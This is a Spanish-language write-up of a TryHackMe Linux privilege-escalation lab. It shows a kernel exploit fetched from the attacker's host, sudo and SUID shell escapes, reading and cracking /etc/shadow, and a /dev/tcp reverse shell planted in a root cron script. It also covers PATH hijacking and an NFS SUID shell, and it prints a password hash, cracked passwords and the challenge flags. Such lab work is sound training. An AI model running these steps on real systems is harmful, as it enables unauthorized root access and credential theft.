# TryHackMe — Room: Linux Privilege Escalation
## Writeup completo

**Objetivo:** aprender y practicar los principales vectores de escalación
de privilegios en Linux, desde enumeración hasta explotación.

**Sistema objetivo:** Ubuntu 14.04 LTS — Kernel 3.13.0-24-generic
**Dificultad:** Medium
**Usuario inicial:** karen
**Técnicas cubiertas:** kernel exploits, sudo abuse, SUID, capabilities,
cron jobs, PATH hijacking, NFS misconfiguration

---

## Task 1 & 2 — Introducción y Concepto

La escalación de privilegios consiste en pasar de una cuenta con permisos
bajos a una con permisos más altos. En un pentest real es raro obtener
acceso administrativo directo — la escalación de privilegios es el paso
que convierte un acceso inicial limitado en control total del sistema.

Permite: resetear contraseñas, evadir controles de acceso, modificar
configuraciones, establecer persistencia y ejecutar cualquier comando
administrativo.

---

## Task 3 — Enumeración

La enumeración es el primer paso después de obtener acceso inicial.
Consiste en recopilar información del sistema para identificar vectores
de escalación.

### Comandos de enumeración usados

```bash
hostname          # nombre del sistema
uname -a          # versión del kernel y arquitectura
cat /proc/version # versión del kernel + compilador
cat /etc/issue    # distribución Linux
python --version  # versión de Python instalada
id                # usuario actual y grupos
sudo -l           # programas que puede ejecutar con sudo
```

### Resultados

| Campo | Valor |
|---|---|
| Hostname | wade7363 |
| Kernel | 3.13.0-24-generic |
| Distribución | Ubuntu 14.04 LTS |
| Python | 2.7.6 |
| Usuario inicial | karen |

### Vulnerabilidad identificada en el kernel

Investigando la versión `3.13.0-24-generic` se identificó:
**CVE-2015-1328** — vulnerabilidad de escalación de privilegios local
via overlayfs en kernels de Ubuntu anteriores a junio de 2015.

---

## Task 4 — Herramientas de Enumeración Automatizada

Herramientas disponibles para automatizar la enumeración:

| Herramienta | URL | Para qué sirve |
|---|---|---|
| LinPeas | github.com/carlospolop/PEASS-ng | Enumeración exhaustiva |
| LinEnum | github.com/rebootuser/LinEnum | Enumeración rápida |
| LES | github.com/mzet-/linux-exploit-suggester | Sugerir exploits de kernel |
| LSE | github.com/diego-treitos/linux-smart-enumeration | Enumeración inteligente |
| LinPrivChecker | github.com/linted/linuxprivchecker | Verificación de privesc |

Nota: la disponibilidad de estas herramientas depende del entorno del
sistema objetivo — si Python no está instalado, no se pueden usar
herramientas escritas en Python.

---

## Task 5 — Escalación via Kernel Exploit (CVE-2015-1328)

### Vector
El kernel 3.13.0-24-generic es vulnerable a CVE-2015-1328 — un bug en
el manejo de permisos de overlayfs que permite a un usuario sin
privilegios escalar a root.

### Exploit usado
**EDB-37292** — `ofs.c` (overlayfs local root exploit)
Fuente: https://www.exploit-db.com/exploits/37292

### Proceso de explotación

**En Kali (atacante):** levantar servidor HTTP para transferir el exploit:
```bash
python3 -m http.server 8000
```

**En el sistema objetivo:**
```bash
# Descargar el exploit
cd /tmp
wget http://<IP-tun0>:8000/ofs.c

# Compilar
gcc ofs.c -o ofs

# Ejecutar
./ofs
```

### Resultado
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root)
```

### Flag
```bash
find / -name flag1.txt 2>/dev/null
# /home/matt/flag1.txt
cat /home/matt/flag1.txt
```
**flag1:** `THM-28392872729920`

### Cómo funciona el exploit
El exploit abusa de overlayfs dentro de user namespaces para crear
una estructura de directorios que permite escribir `/etc/ld.so.preload`
— un archivo que el sistema carga antes de cualquier ejecutable.
Al insertar una librería maliciosa en ese archivo, el exploit logra
ejecutar código como root cuando se llama a `/bin/su`.

---

## Task 6 — Escalación via Sudo

### Enumeración de permisos sudo
```bash
sudo -l
```

**Resultado:** karen puede ejecutar con sudo sin contraseña:
- `/usr/bin/find`
- `/usr/bin/less`
- `/usr/bin/nano`

### Técnica usada: nano sudo abuse

GTFOBins documenta que nano puede usarse para escalar privilegios
cuando se ejecuta con sudo, usando su función de lectura de archivos
externos (`Ctrl+R`) combinada con la ejecución de comandos (`Ctrl+X`).

```bash
sudo nano
# Dentro de nano:
# Ctrl+R → Ctrl+X
# Ejecutar: reset; sh 1>&0 2>&0
```

Esto abre una shell de root dentro del contexto de nano.

### Flag
**flag2:** `THM-402028394`

### Hash de frank
```
$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

### Cómo usar nmap para escalar con sudo
Si el usuario tuviera sudo sobre nmap:
```bash
sudo nmap --interactive
nmap> !sh
```

---

## Task 7 — Escalación via SUID

### Enumeración de binarios SUID
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Los bits SUID permiten ejecutar un archivo con los privilegios de su
propietario (normalmente root) en vez de los del usuario que lo ejecuta.

### Técnica usada: base64 SUID abuse

`/usr/bin/base64` tenía el bit SUID configurado. GTFOBins documenta
que base64 puede usarse para leer archivos arbitrarios como root:

```bash
# Leer /etc/shadow (requiere root normalmente)
/usr/bin/base64 /etc/shadow | base64 --decode

# Leer /etc/passwd
/usr/bin/base64 /etc/passwd | base64 --decode
```

### Crackear contraseña de user2
```bash
# En el sistema objetivo: exportar passwd y shadow
/usr/bin/base64 /etc/passwd | base64 --decode > passwd.txt
/usr/bin/base64 /etc/shadow | base64 --decode > shadow.txt

# En Kali: combinar y crackear
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

**Contraseña de user2:** `Password1`

### Flag
**flag3:** `THM-3847834`

### Usuario con nombre de escritor de cómics
`gerryconway` — co-creador de The Punisher (Marvel Comics)

---

## Task 8 — Escalación via Capabilities

### Concepto
Las capabilities de Linux permiten otorgar privilegios específicos a
binarios sin darles acceso root completo. A diferencia de SUID,
no aparecen en búsquedas estándar de permisos.

### Enumeración
```bash
getcap -r / 2>/dev/null
```

**Resultado:** 6 binarios con capabilities configuradas.

### Técnica usada: view capabilities abuse

El binario `view` tenía `cap_setuid` configurado. GTFOBins documenta
su explotación:

```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Esto ejecuta Python dentro de vim/view, cambia el UID a 0 (root)
y lanza una shell.

### Flag
**flag4:** `THM-9349843`

---

## Task 9 — Escalación via Cron Jobs

### Concepto
Los cron jobs ejecutan scripts de forma automática con los privilegios
del usuario propietario. Si un cron job de root ejecuta un script
modificable por usuarios sin privilegios, es un vector de escalación.

### Enumeración
```bash
cat /etc/crontab
```

**Resultado:** 4 cron jobs definidos por el usuario.

### Técnica usada: reverse shell via cron job

Se identificó que `/home/karen/backup.sh` era ejecutado por root
pero tenía permisos de escritura para karen. Se inyectó una reverse
shell en el script:

```bash
# Editar el script vulnerable
nano /home/karen/backup.sh

# Contenido inyectado:
#!/bin/bash
bash -i >& /dev/tcp/<IP-Kali>/1234 0>&1

# Dar permisos de ejecución
chmod +x /home/karen/backup.sh

# En Kali: escuchar la conexión entrante
nc -lvnp 1234
```

Cuando el cron job se ejecutó, el sistema objetivo se conectó a Kali
entregando una shell de root.

### Flag
**flag5:** `THM-383000283`

### Contraseña de Matt
Usando unshadow + john sobre `/etc/shadow`:
**Contraseña de Matt:** `123456`

---

## Task 10 — Escalación via PATH Hijacking

### Concepto
La variable `$PATH` define en qué directorios busca el sistema los
ejecutables. Si un binario SUID llama a otro ejecutable sin ruta
absoluta, un atacante puede colocar un script malicioso con ese mismo
nombre en un directorio que controla y que esté primero en el PATH.

### Enumeración
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

**Directorio extraño con acceso de escritura:** `/home/murdoch`

### Técnica usada

En `/home/murdoch` había un ejecutable `test` que llamaba a un binario
llamado `thm` sin ruta absoluta.

```bash
# Agregar /home/murdoch al PATH
export PATH=/home/murdoch:$PATH

# Crear script malicioso "thm" que lee la flag
echo "cat /home/matt/flag6.txt" > /home/murdoch/thm
chmod 777 /home/murdoch/thm

# Ejecutar el binario vulnerable
./test
```

El binario `test` buscó `thm` en el PATH, encontró el script malicioso
primero y lo ejecutó con privilegios elevados.

### Flag
**flag6:** `THM-736628929`

---

## Task 11 — Escalación via NFS Misconfiguration

### Concepto
NFS (Network File System) permite montar sistemas de archivos remotos.
La opción `no_root_squash` en la configuración de NFS significa que
archivos creados por root en el share remoto conservan sus privilegios
de root en el sistema objetivo — permitiendo crear ejecutables SUID
desde una máquina atacante.

### Enumeración
```bash
# En el sistema objetivo
cat /etc/exports

# En Kali
showmount -e <IP-objetivo>
```

**Resultado:** 3 shares montables, los 3 con `no_root_squash`.

### Técnica usada

```bash
# En Kali: montar el share
mkdir /tmp/nfs
mount -o rw <IP-objetivo>:/home/ubuntu/sharedfolder /tmp/nfs
cd /tmp/nfs

# Crear ejecutable que lanza shell de root
cat > shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc shell.c -o shell -w
chmod +s shell

# En el sistema objetivo: ejecutar
./shell
```

### Flag
**flag7:** `THM-89384012`

---

## Task 12 — Capstone Challenge

### Objetivo
Escalar a root en un sistema sin guía — aplicando las técnicas
aprendidas de forma autónoma.

### Proceso de explotación

**Paso 1:** enumeración de binarios SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```
Se identificó `/usr/bin/base64` con bit SUID.

**Paso 2:** leer `/etc/shadow` via base64
```bash
/usr/bin/base64 /etc/shadow | base64 --decode
```

**Paso 3:** crackear contraseñas con unshadow + john
```bash
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```
Se obtuvo la contraseña de `missy`.

**Paso 4:** escalación horizontal a missy
```bash
su missy
```

**Paso 5:** verificar permisos sudo de missy
```bash
sudo -l
# missy puede ejecutar /usr/bin/find como root
```

**Paso 6:** escalación vertical a root via find
```bash
sudo find . -exec /bin/sh \; -quit
```

### Flags del capstone

**flag1** (encontrada como missy): `THM-42828719920544`
**flag2** (encontrada como root): `THM-168824782390238`

---

## Resumen — Vectores de escalación de privilegios cubiertos

| Vector | Técnica | Herramienta |
|---|---|---|
| Kernel exploit | CVE-2015-1328 overlayfs | ofs.c (EDB-37292) |
| Sudo abuse | nano Ctrl+R/X shell escape | GTFOBins |
| SUID abuse | base64 para leer archivos | GTFOBins |
| Capabilities | view cap_setuid Python shell | GTFOBins |
| Cron job | reverse shell en script writable | netcat |
| PATH hijacking | script malicioso en PATH | bash |
| NFS | SUID binary via no_root_squash | gcc |
| Capstone | SUID → shadow → crack → sudo find | john + GTFOBins |

## Herramientas usadas
- Nmap (enumeración inicial)
- gcc (compilación de exploits en C)
- John the Ripper + rockyou.txt (cracking de hashes)
- unshadow (preparación de hashes para john)
- netcat (listener para reverse shell)
- GTFOBins (referencia de técnicas de abuso de binarios)
- Python3 http.server (transferencia de archivos)
